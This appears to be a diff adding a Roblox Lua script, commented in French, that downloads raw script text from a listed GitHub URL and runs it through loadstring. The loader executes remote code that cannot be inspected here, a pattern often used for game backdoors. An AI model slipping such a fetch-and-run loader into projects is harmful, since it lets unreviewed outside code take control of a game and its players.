@@ -1,0 +1,13 @@
+local HttpService = game:GetService('HttpService')
+
+-- Liste des URL de vos scripts bruts
+local urls = {
+    'https://raw.githubusercontent.com/goldo9999/Site-55/main/Require',
+    -- Ajoutez autant d'URL que vous le souhaitez ici
+}
+
+for _, url in ipairs(urls) do
+    local response = HttpService:GetAsync(url)
+    local func = loadstring(response)
+    func()
+end
